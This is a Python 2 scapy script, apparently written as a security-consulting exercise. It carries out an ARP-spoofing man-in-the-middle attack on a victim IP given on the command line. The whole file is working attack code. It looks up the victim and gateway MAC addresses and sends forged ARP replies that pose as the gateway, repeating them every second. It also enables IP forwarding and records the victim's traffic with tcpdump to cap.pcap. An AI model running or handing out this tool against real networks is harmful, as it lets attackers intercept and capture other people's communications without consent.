# coding:utf-8
# author:Security Consulting_HanChaemin

import os, sys, subprocess, re, time
from scapy.all import *


# 공격 대상 IP 입력 확인
def usage():
	print "Usage : %s VICTIM_IP" % sys.argv[0]
	print "   ex : %s 192.168.100.120" % sys.argv[0]

# attack ip
def get_my_ip():
	ip = os.popen('ip addr show ens33 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
	return ip

# 공격자 MAC 주소 가져옴
def get_my_mac():
	with open('/sys/class/net/ens33/address') as f:
		mac = f.read().upper()
		return mac


# 동일 서브넷 기준, 게이트웨이 IP 가져옴
def get_gw_addr():
	cmd = "ip r | awk '/^def/{print $3}'"
	gw_addr = subprocess.check_output(cmd, shell=True)
	
	return gw_addr

# 주어진 IP의 MAC 주소 가져옴
def get_re_mac(local_ip, remote_ip):
	cmd = '(echo "from scapy.all import *"; echo "res=sr1(ARP(op=ARP.who_has, psrc=\'%s\', pdst=\'%s\'))"; echo "res_str=repr(res)"; echo "re_mac = re.search(r\'([0-9A-F]{2}[::]){5}([0-9A-F]{2})\', res_str, re.I).group().upper()"; echo "print re_mac") | python | tail -n 1' % (local_ip, remote_ip)

	gw_mac = subprocess.check_output(cmd, shell=True)
	return gw_mac


'''
	res = sr1(ARP(op=ARP.who_has, psrc=local_ip, pdst=remote_ip))
	res_str = repr(res)
	re_mac = re.search(r'([0-9A-F]{2}[::]){5}([0-9A-F]{2})', res_str, re.I).group().upper()

	return re_mac
'''

'''
	re_ip = re_ip.replace('\n', '')
	cmd = 'arping -c 1 ' + re_ip

	gw_mac = subprocess.check_output(cmd, shell=True)
	gw_mac = re.search(r'([0-9A-F]{2}[::]){5}([0-9A-F]{2})', gw_mac, re.I).group().upper()
	return gw_mac
'''

# 패킷 포워딩 활성화
def enable_forward():
	cmd = "echo '1' > /proc/sys/net/ipv4/ip_forward"
	subprocess.check_output(cmd, shell=True)


# Victim이 공격자(GW)를 통해 송/수신하는 패킷 캡쳐 -> cap.pcap 파일로 저장
def packet_print(victim_ip):
	#cmd = "tcpdump -i ens33 '((src host %s) or (dst host %s))' -w cap.pcap" % (victim_ip, victim_ip)
	subprocess.Popen(["tcpdump", "-i", "ens33", "src", "host", victim_ip, "or", "dst", "host", victim_ip, "", "-w", "cap.pcap"])




if __name__ == "__main__":
	# 공격 대상 IP 입력 확인
	if len(sys.argv) != 2:
		usage()
		sys.exit(-1)

	my_ip = get_my_ip()
	my_mac = get_my_mac()
	print "Local IP  Addr :", my_ip
	print "Local MAC Addr :", my_mac

	vi_ip = sys.argv[1] 
	vi_mac = get_re_mac(my_ip, vi_ip)
	print "Victim IP  Addr :", vi_ip
	print "Victim MAC Addr :", vi_mac

	gw_ip = get_gw_addr().replace('\n','')
	gw_mac = get_re_mac(my_ip, gw_ip)
	print 
	print "GateWay IP  Addr :", gw_ip
	print "GateWay MAC Addr :", gw_mac

	# 공격 대상에게 ARP 패킷 전송(GW IP에 대한 맥을 공격자의 맥으로 세팅하라는 패킷)
	# 공격 대상 ARP 테이블이 변조되지 않으면 다수의 arp 패킷 전송
	packet = Ether()/ARP(op="who-has", hwsrc=my_mac,psrc=gw_ip,pdst=sys.argv[1])
	sendp(packet)


	print "[*] Attacking..."

	print "\t[-] Enabling Packet Forward..."
	print 
	enable_forward()

	print "\t[-] Caputring Packet..."
	print "\t[-] Capture result will be saved as cap.pcap at current dir"
	print"\t\t[1] Victim -> Attacker(Spoofed as GW) -> Dst"
	print"\t\t[2] Dst -> Attacker(Spoofed as GW) -> Victim"
	print
	packet_print(vi_ip)


	# 1초마다 ARP Spoofing 패킷 전송
	print "Sending ARP Spoofing packet every 1 sec..."
	while True:
		time.sleep(1)
		packet = Ether()/ARP(op="who-has", hwsrc=my_mac,psrc=gw_ip,pdst=sys.argv[1])
		sendp(packet)
